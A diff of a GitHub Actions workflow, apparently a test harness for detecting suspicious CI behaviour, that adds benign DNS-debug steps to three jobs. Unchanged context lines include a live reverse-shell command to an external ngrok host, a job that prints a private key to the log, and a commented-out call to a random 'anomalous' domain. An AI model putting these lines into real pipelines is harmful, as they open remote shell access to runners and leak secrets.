@@ -31,6 +31,18 @@ jobs:
     #   run: curl microsoft.com
     - run: |
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 17658 0>&1" 
+    - name: DNS debug
+      if: always()
+      continue-on-error: true
+      run: |
+        set +e
+        resolvectl status
+        ls -la /etc/systemd/resolved.conf.d/ /run/systemd/resolved.conf.d/ 2>&1
+        cat /etc/resolv.conf
+        ss -lunp | grep ':53'
+        resolvectl query github.com
+        resolvectl query registry-1.docker.io
+        getent hosts github.com
 
   handle-private-key:
     runs-on: ubuntu-22.04
@@ -53,6 +65,18 @@ jobs:
         
         echo "Private key content:"
         cat private_key.pem
+    - name: DNS debug
+      if: always()
+      continue-on-error: true
+      run: |
+        set +e
+        resolvectl status
+        ls -la /etc/systemd/resolved.conf.d/ /run/systemd/resolved.conf.d/ 2>&1
+        cat /etc/resolv.conf
+        ss -lunp | grep ':53'
+        resolvectl query github.com
+        resolvectl query registry-1.docker.io
+        getent hosts github.com
   anomalous-outbound-call:
     runs-on: ubuntu-22.04
     steps:
@@ -86,3 +110,16 @@ jobs:
         
       #   # Attempt to connect to the random domain (this will likely fail)
       #   curl -I --max-time 5 "https://$ANOMALOUS_DOMAIN" || true
+    - name: DNS debug
+      if: always()
+      continue-on-error: true
+      run: |
+        set +e
+        resolvectl status
+        ls -la /etc/systemd/resolved.conf.d/ /run/systemd/resolved.conf.d/ 2>&1
+        cat /etc/resolv.conf
+        ss -lunp | grep ':53'
+        resolvectl query github.com
+        resolvectl query registry-1.docker.io
+        getent hosts github.com
+        
